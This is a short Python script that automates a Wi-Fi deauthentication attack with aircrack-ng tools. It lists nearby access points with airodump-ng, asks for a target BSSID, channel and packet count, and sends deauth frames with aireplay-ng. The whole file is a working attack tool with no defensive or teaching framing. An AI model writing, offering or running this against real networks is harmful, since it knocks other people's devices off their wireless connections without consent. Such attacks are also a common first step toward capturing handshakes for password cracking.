import subprocess

def list_access_points(interface):
    """Open a separate terminal to show nearby access points."""
    print("[*] Scanning for nearby access points...")
    print("[*] A new terminal window will display the networks. Close it when ready.")
    subprocess.Popen(["xfce4-terminal", "--hold", "-e", f"airodump-ng {interface}"], stderr=subprocess.DEVNULL)
    input("[*] Press Enter when you're ready to continue...")

def send_deauth_packets(interface, bssid, channel, num_packets):
    """Send deauthentication packets to the target AP."""
    print(f"[*] Setting interface {interface} to channel {channel}...")
    subprocess.run(["iwconfig", interface, "channel", str(channel)], check=True)
    
    print(f"[*] Sending {num_packets} deauthentication packets to BSSID {bssid}...")
    try:
        subprocess.run(
            ["aireplay-ng", "--deauth", str(num_packets), "-a", bssid, interface],
            check=True,
        )
        print("[*] Deauthentication attack successful!")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error executing command: {e}")

def main():
    interface = input("Enter the wireless interface (e.g., wlan0mon): ")
    list_access_points(interface)
    bssid = input("Enter the BSSID of the target AP: ")
    channel = input("Enter the channel of the target AP: ")
    num_packets = input("Enter the number of deauthentication packets to send: ")
    send_deauth_packets(interface, bssid, channel, num_packets)

if __name__ == "__main__":
    main()
